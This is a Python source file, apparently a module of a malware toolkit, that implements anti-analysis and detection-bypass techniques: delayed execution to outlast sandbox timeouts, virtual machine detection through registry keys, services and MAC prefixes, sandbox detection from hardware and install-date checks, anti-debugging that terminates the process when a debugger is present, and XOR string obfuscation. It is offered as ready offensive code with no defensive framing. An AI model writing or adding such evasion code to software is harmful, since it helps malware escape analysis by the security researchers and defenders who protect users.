"""Evasion techniques — anti-analysis and detection bypass."""

import os
import sys
import time
import platform
import subprocess


def sleep_evasion(seconds: int = 30):
    """Sleep before executing to evade sandbox timeouts."""
    time.sleep(seconds)


def check_vm() -> bool:
    """Detect virtual machine environment."""
    indicators = []
    system = platform.system()

    if system == "Windows":
        try:
            import winreg
            keys = [
                r"SOFTWARE\VMware, Inc.\VMware Tools",
                r"SOFTWARE\Oracle\VirtualBox Guest Additions",
                r"SYSTEM\ControlSet001\Services\VBoxGuest",
            ]
            for key in keys:
                try:
                    winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key)
                    indicators.append("registry")
                except Exception:
                    pass
        except Exception:
            pass

    try:
        result = subprocess.run(
            ["systemctl", "status", "vboxadd-service"],
            capture_output=True, timeout=5
        )
        if "active" in result.stdout.decode():
            indicators.append("systemd")
    except Exception:
        pass

    mac_prefixes = ["00:0C:29", "00:50:56", "08:00:27", "00:1C:42"]
    try:
        import uuid
        mac = ":".join(f"{(uuid.getnode() >> i) & 0xFF:02x}" for i in range(0, 48, 8))
        if any(mac.upper().startswith(p) for p in mac_prefixes):
            indicators.append("mac")
    except Exception:
        pass

    return len(indicators) > 0


def check_sandbox() -> bool:
    """Detect sandbox environment."""
    checks = []

    # Check for minimal hardware (sandboxes often have 1 CPU / <2GB RAM)
    try:
        import multiprocessing
        if multiprocessing.cpu_count() < 2:
            checks.append("cpu")
    except Exception:
        pass

    # Check for recently installed OS
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion",
                0,
                winreg.KEY_READ,
            )
            install_date, _ = winreg.QueryValueEx(key, "InstallDate")
            if time.time() - install_date < 86400 * 3:  # < 3 days old
                checks.append("fresh_install")
    except Exception:
        pass

    # Check for common sandbox tools
    sandbox_paths = [
        "C:\\analyzed_files",
        "/tmp/.sandbox",
        "C:\\tools\\procmon",
    ]
    for path in sandbox_paths:
        if os.path.exists(path):
            checks.append("sandbox_files")

    return len(checks) > 0


def anti_debug():
    """Detect and evade debuggers."""
    if platform.system() == "Windows":
        try:
            import ctypes
            if ctypes.windll.kernel32.IsDebuggerPresent():
                ctypes.windll.kernel32.TerminateProcess(
                    ctypes.windll.kernel32.GetCurrentProcess(), 0
                )
        except Exception:
            pass
    elif platform.system() == "Linux":
        try:
            status = open("/proc/self/status").read()
            if "TracerPid:\t0" not in status:
                os._exit(1)
        except Exception:
            pass


def obfuscate_string(s: str) -> str:
    """Simple XOR obfuscation for strings."""
    key = 0x42
    return "".join(chr(ord(c) ^ key) for c in s)
